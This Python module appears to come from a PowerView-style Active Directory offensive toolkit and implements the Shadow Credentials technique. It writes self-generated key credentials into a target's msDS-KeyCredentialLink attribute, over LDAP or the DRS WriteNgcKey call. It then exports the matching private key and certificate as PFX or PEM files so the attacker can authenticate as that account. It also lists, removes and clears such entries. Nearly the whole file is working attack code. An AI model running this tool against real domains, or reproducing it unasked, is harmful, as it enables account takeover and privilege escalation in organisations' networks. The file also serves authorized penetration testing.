#!/usr/bin/env python3
import logging
import os
import random
import string
import datetime as dt
from typing import List, Tuple, Optional

import ldap3
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption
from cryptography.hazmat.backends import default_backend
from cryptography import x509
from cryptography.x509.oid import NameOID

from dsinternals.system.Guid import Guid
from dsinternals.system.DateTime import DateTime
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.common.data.DNWithBinary import DNWithBinary

from powerview.lib.drsr import DRSHandler


class ShadowCredential:
	"""Manage msDS-KeyCredentialLink (Shadow Credentials) on AD objects."""

	def __init__(self, powerview):
		self.powerview = powerview
		self.ldap_session = powerview.ldap_session
		self.root_dn = powerview.root_dn

	def execute(
		self,
		identity: str,
		action: str = "add",
		device_id: Optional[str] = None,
		export: str = "PFX",
		cert_outfile: Optional[str] = None,
		pfx_password: Optional[str] = None,
		no_password: bool = False,
		key_size: int = 2048,
		searchbase: Optional[str] = None,
		use_drs: bool = False,
	):
		if not identity:
			logging.error("[Set-ShadowCredential] -Identity is required")
			return None

		searchbase = searchbase or self.root_dn
		entry = self._resolve_target(identity, searchbase)
		if not entry:
			return None

		action = (action or "add").lower()

		if use_drs:
			if action == "list":
				return self._list_drs(entry)
			if action == "clear":
				return self._clear_drs(entry)
			if action == "remove":
				logging.error("[Set-ShadowCredential] -Remove is not supported with -DRS. DRS stores a single NGC key; use -Clear instead")
				return None
			return self._add_drs(entry, export, cert_outfile, pfx_password, no_password, key_size)

		if action == "list":
			return self._list(entry)
		if action == "clear":
			return self._clear(entry)
		if action == "remove":
			return self._remove(entry, device_id)
		return self._add(entry, export, cert_outfile, pfx_password, no_password, key_size)

	def _resolve_target(self, identity: str, searchbase: str):
		properties = [
			"distinguishedName",
			"objectSid",
			"sAMAccountName",
			"msDS-KeyCredentialLink",
			"objectClass",
		]
		entries = self.powerview.get_domainobject(
			identity=identity,
			properties=properties,
			searchbase=searchbase,
			raw=True,
			no_cache=True,
			no_vuln_check=True,
		)

		if len(entries) == 0:
			logging.error(f"[Set-ShadowCredential] {identity} identity not found in domain")
			return None
		if len(entries) > 1:
			logging.error("[Set-ShadowCredential] More than one identity found. Use a unique identity")
			return None

		return entries[0]

	def _get_target_dn(self, entry):
		return entry.get("dn") or entry.get("attributes", {}).get("distinguishedName")

	def _get_target_sid(self, entry):
		sid = entry.get("attributes", {}).get("objectSid")
		if isinstance(sid, list):
			sid = sid[0]
		return sid

	def _get_target_sam(self, entry):
		sam = entry.get("attributes", {}).get("sAMAccountName")
		if isinstance(sam, list):
			sam = sam[0]
		return sam

	def _get_raw_keycreds(self, entry) -> List[bytes]:
		raw = entry.get("raw_attributes", {}).get("msDS-KeyCredentialLink")
		if not raw:
			return []
		normalized = []
		for item in raw:
			if isinstance(item, bytes):
				normalized.append(item)
			elif isinstance(item, str):
				normalized.append(item.encode())
			else:
				try:
					normalized.append(bytes(item))
				except Exception:
					continue
		return normalized

	def _parse_keycreds(self, raw_values: List[bytes]) -> List[Tuple[bytes, Optional[KeyCredential]]]:
		parsed = []
		for raw in raw_values:
			try:
				dnwb = DNWithBinary.fromRawDNWithBinary(raw)
				kc = KeyCredential.fromDNWithBinary(dnwb)
				parsed.append((raw, kc))
			except Exception:
				parsed.append((raw, None))
		return parsed

	def _random_token(self, length: int = 8) -> str:
		alphabet = string.ascii_letters + string.digits
		return "".join(random.choice(alphabet) for _ in range(length))

	def _normalize_outfile(self, path: str) -> str:
		path = path.strip()
		lower = path.lower()
		if lower.endswith(".pfx"):
			return path[:-4]
		if lower.endswith("_cert.pem"):
			return path[:-9]
		if lower.endswith("_priv.pem"):
			return path[:-9]
		if lower.endswith(".pem"):
			return path[:-4]
		return path

	def _add(self, entry, export: str, cert_outfile: Optional[str], pfx_password: Optional[str], no_password: bool, key_size: int):
		target_dn = self._get_target_dn(entry)
		target_sid = self._get_target_sid(entry)
		target_sam = self._get_target_sam(entry)
		if not target_dn:
			logging.error("[Set-ShadowCredential] Target object has no distinguishedName")
			return None

		subject = str(target_sid or target_sam or target_dn)
		certificate = X509Certificate2(subject=subject, keySize=key_size, notBefore=(-40 * 365), notAfter=(40 * 365))
		key_cred = KeyCredential.fromX509Certificate2(
			certificate=certificate,
			deviceId=Guid(),
			owner=target_dn,
			currentTime=DateTime()
		)
		keycred_dnwb = key_cred.toDNWithBinary().toString().encode()

		existing = self._get_raw_keycreds(entry)
		new_values = existing + [keycred_dnwb]

		logging.info(f"[Set-ShadowCredential] Updating msDS-KeyCredentialLink on {target_dn}")
		self.ldap_session.modify(target_dn, {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, new_values]})

		result = self.ldap_session.result
		if result.get("result") != 0:
			self._log_ldap_error("Set-ShadowCredential", result)
			return None

		logging.info("[Set-ShadowCredential] Shadow credential added")
		export = (export or "PFX").upper()
		cert_paths = {}

		if export != "NONE":
			base_path = cert_outfile or self._random_token()
			base_path = self._normalize_outfile(base_path)

			if export == "PEM":
				certificate.ExportPEM(path_to_files=base_path)
				cert_paths["CertPath"] = base_path + "_cert.pem"
				cert_paths["KeyPath"] = base_path + "_priv.pem"
			elif export == "PFX":
				if not pfx_password:
					if no_password:
						pfx_password = None
					else:
						pfx_password = self._random_token(20)
				if pfx_password is None:
					if len(os.path.dirname(base_path)) != 0:
						if not os.path.exists(os.path.dirname(base_path)):
							os.makedirs(os.path.dirname(base_path), exist_ok=True)
					p12 = pkcs12.serialize_key_and_certificates(
						b"",
						certificate.key.to_cryptography_key(),
						certificate.certificate.to_cryptography(),
						None,
						NoEncryption(),
					)
					with open(base_path + ".pfx", "wb") as f:
						f.write(p12)
				else:
					certificate.ExportPFX(path_to_file=base_path, password=pfx_password)
				cert_paths["PfxPath"] = base_path + ".pfx"
				if pfx_password:
					cert_paths["PfxPassword"] = pfx_password
			else:
				logging.error("[Set-ShadowCredential] Invalid export type. Use PFX, PEM, or NONE")

		return [
			{
				"attributes": {
					"TargetDN": target_dn,
					"TargetSID": str(target_sid) if target_sid else None,
					"DeviceId": key_cred.DeviceId.toFormatD(),
					"Export": export,
					**cert_paths,
				}
			}
		]

	def _clear(self, entry):
		target_dn = self._get_target_dn(entry)
		if not target_dn:
			logging.error("[Set-ShadowCredential] Target object has no distinguishedName")
			return None

		logging.info(f"[Set-ShadowCredential] Clearing msDS-KeyCredentialLink on {target_dn}")
		self.ldap_session.modify(target_dn, {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, []]})
		result = self.ldap_session.result
		if result.get("result") != 0:
			self._log_ldap_error("Set-ShadowCredential", result)
			return None

		return [{"attributes": {"TargetDN": target_dn, "Cleared": True}}]

	def _remove(self, entry, device_id: Optional[str]):
		if not device_id:
			logging.error("[Set-ShadowCredential] -DeviceId is required when using -Remove")
			return None

		guid = Guid.load(device_id)
		if guid is None:
			logging.error("[Set-ShadowCredential] Invalid DeviceId format")
			return None

		target_dn = self._get_target_dn(entry)
		if not target_dn:
			logging.error("[Set-ShadowCredential] Target object has no distinguishedName")
			return None

		raw_values = self._get_raw_keycreds(entry)
		parsed = self._parse_keycreds(raw_values)
		keep_values = []
		removed = 0
		needle = guid.toFormatD().lower()

		for raw, kc in parsed:
			if kc is None:
				keep_values.append(raw)
				continue
			if kc.DeviceId and kc.DeviceId.toFormatD().lower() == needle:
				removed += 1
				continue
			keep_values.append(raw)

		if removed == 0:
			logging.warning("[Set-ShadowCredential] No matching DeviceId found")
			return [{"attributes": {"TargetDN": target_dn, "Removed": 0}}]

		logging.info(f"[Set-ShadowCredential] Removing DeviceId {guid.toFormatD()} from {target_dn}")
		self.ldap_session.modify(target_dn, {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, keep_values]})
		result = self.ldap_session.result
		if result.get("result") != 0:
			self._log_ldap_error("Set-ShadowCredential", result)
			return None

		return [{"attributes": {"TargetDN": target_dn, "Removed": removed}}]

	def _list(self, entry):
		target_dn = self._get_target_dn(entry)
		raw_values = self._get_raw_keycreds(entry)
		parsed = self._parse_keycreds(raw_values)
		entries = []
		for raw, kc in parsed:
			if kc is None:
				entries.append({
					"attributes": {
						"TargetDN": target_dn,
						"ParseError": True,
						"Raw": raw.decode(errors="replace") if isinstance(raw, (bytes, bytearray)) else str(raw)
					}
				})
				continue
			entries.append({
				"attributes": {
					"TargetDN": target_dn,
					"DeviceId": kc.DeviceId.toFormatD(),
					"CreationTime": str(kc.CreationTime),
					"Owner": kc.Owner,
					"KeyId": kc.Identifier,
				}
			})
		return entries

	def list_entry(self, entry):
		"""List shadow credentials from a pre-resolved entry dict (no LDAP re-query)."""
		return self._list(entry)

	# ── DRS methods ────────────────────────────────────────────────────

	def _drs_connect(self, target=None):
		"""Create a DRS connection using the current PowerView connection."""
		drs = DRSHandler(self.powerview.conn)
		drs.connect(target=target)
		return drs

	def _generate_drs_keypair(self, subject_name, key_size=2048):
		"""Generate RSA key pair and self-signed certificate for PKINIT."""
		private_key = rsa.generate_private_key(
			public_exponent=65537,
			key_size=key_size,
			backend=default_backend(),
		)
		cert = (
			x509.CertificateBuilder()
			.subject_name(x509.Name([
				x509.NameAttribute(NameOID.COMMON_NAME, subject_name),
			]))
			.issuer_name(x509.Name([
				x509.NameAttribute(NameOID.COMMON_NAME, subject_name),
			]))
			.public_key(private_key.public_key())
			.serial_number(x509.random_serial_number())
			.not_valid_before(dt.datetime.utcnow())
			.not_valid_after(dt.datetime.utcnow() + dt.timedelta(days=365))
			.sign(private_key, hashes.SHA256(), default_backend())
		)
		return private_key, cert

	def _export_drs_cert(self, private_key, cert, export, cert_outfile, pfx_password, no_password):
		"""Export certificate/key for DRS-written shadow credential."""
		export = (export or "PFX").upper()
		cert_paths = {}

		if export == "NONE":
			return cert_paths

		base_path = cert_outfile or self._random_token()
		base_path = self._normalize_outfile(base_path)

		if export == "PEM":
			cert_pem = cert.public_bytes(serialization.Encoding.PEM)
			key_pem = private_key.private_bytes(
				encoding=serialization.Encoding.PEM,
				format=serialization.PrivateFormat.TraditionalOpenSSL,
				encryption_algorithm=serialization.NoEncryption(),
			)
			cert_path = base_path + "_cert.pem"
			key_path = base_path + "_priv.pem"
			with open(cert_path, 'wb') as f:
				f.write(cert_pem)
			with open(key_path, 'wb') as f:
				f.write(key_pem)
			cert_paths["CertPath"] = cert_path
			cert_paths["KeyPath"] = key_path
		elif export == "PFX":
			if not pfx_password:
				if no_password:
					pfx_password = None
				else:
					pfx_password = self._random_token(20)
			if pfx_password is None:
				encryption = NoEncryption()
			else:
				encryption = serialization.BestAvailableEncryption(pfx_password.encode())
			if len(os.path.dirname(base_path)) != 0:
				if not os.path.exists(os.path.dirname(base_path)):
					os.makedirs(os.path.dirname(base_path), exist_ok=True)
			p12 = pkcs12.serialize_key_and_certificates(
				b"shadow-cred",
				private_key,
				cert,
				None,
				encryption,
			)
			pfx_path = base_path + ".pfx"
			with open(pfx_path, 'wb') as f:
				f.write(p12)
			cert_paths["PfxPath"] = pfx_path
			if pfx_password:
				cert_paths["PfxPassword"] = pfx_password

		return cert_paths

	def _add_drs(self, entry, export, cert_outfile, pfx_password, no_password, key_size):
		"""Write shadow credential via DRS IDL_DRSWriteNgcKey (opnum 29)."""
		target_dn = self._get_target_dn(entry)
		target_sam = self._get_target_sam(entry)
		if not target_dn:
			logging.error("[Set-ShadowCredential] Target object has no distinguishedName")
			return None

		subject_name = target_sam or target_dn
		if subject_name.endswith('$'):
			subject_name = subject_name[:-1]

		private_key, cert = self._generate_drs_keypair(subject_name, key_size)
		bcrypt_blob = DRSHandler.rsa_to_bcrypt_blob(private_key)

		drs = None
		try:
			logging.info(f"[Set-ShadowCredential] DRS: Connecting to DC...")
			drs = self._drs_connect()

			logging.info(f"[Set-ShadowCredential] DRS: Writing NGC key to {target_dn} ({len(bcrypt_blob)} bytes)")
			ret = drs.write_ngc_key(target_dn, bcrypt_blob)

			if ret != 0:
				logging.error(f"[Set-ShadowCredential] DRS WriteNgcKey failed: 0x{ret:08x}")
				return None

			logging.info("[Set-ShadowCredential] DRS: NGC key written successfully")
		except Exception as e:
			logging.error(f"[Set-ShadowCredential] DRS error: {e}")
			return None
		finally:
			if drs:
				drs.disconnect()

		cert_paths = self._export_drs_cert(private_key, cert, export, cert_outfile, pfx_password, no_password)

		return [
			{
				"attributes": {
					"TargetDN": target_dn,
					"Method": "DRS",
					"Export": (export or "PFX").upper(),
					**cert_paths,
				}
			}
		]

	def _list_drs(self, entry):
		"""Read NGC key via DRS IDL_DRSReadNgcKey (opnum 30)."""
		target_dn = self._get_target_dn(entry)
		if not target_dn:
			logging.error("[Set-ShadowCredential] Target object has no distinguishedName")
			return None

		drs = None
		try:
			drs = self._drs_connect()
			ret, key_data = drs.read_ngc_key(target_dn)

			if ret != 0:
				logging.error(f"[Set-ShadowCredential] DRS ReadNgcKey failed: 0x{ret:08x}")
				return None

			if not key_data:
				return [{"attributes": {"TargetDN": target_dn, "Method": "DRS", "NgcKey": None}}]

			return [
				{
					"attributes": {
						"TargetDN": target_dn,
						"Method": "DRS",
						"NgcKeySize": len(key_data),
						"NgcKeyBlob": key_data[:24].hex() + "...",
					}
				}
			]
		except Exception as e:
			logging.error(f"[Set-ShadowCredential] DRS error: {e}")
			return None
		finally:
			if drs:
				drs.disconnect()

	def _clear_drs(self, entry):
		"""Clear NGC key via DRS IDL_DRSWriteNgcKey with empty blob."""
		target_dn = self._get_target_dn(entry)
		if not target_dn:
			logging.error("[Set-ShadowCredential] Target object has no distinguishedName")
			return None

		drs = None
		try:
			drs = self._drs_connect()
			ret = drs.write_ngc_key(target_dn, b'')

			if ret != 0:
				logging.error(f"[Set-ShadowCredential] DRS WriteNgcKey (clear) failed: 0x{ret:08x}")
				return None

			logging.info(f"[Set-ShadowCredential] DRS: NGC key cleared on {target_dn}")
			return [{"attributes": {"TargetDN": target_dn, "Method": "DRS", "Cleared": True}}]
		except Exception as e:
			logging.error(f"[Set-ShadowCredential] DRS error: {e}")
			return None
		finally:
			if drs:
				drs.disconnect()

	def _log_ldap_error(self, prefix: str, result: dict):
		code = result.get("result")
		msg = result.get("message")
		if code == 50:
			logging.error(f"[{prefix}] Insufficient rights: {msg}")
		elif code == 19:
			logging.error(f"[{prefix}] Constraint violation: {msg}")
		else:
			logging.error(f"[{prefix}] LDAP error {code}: {msg}")
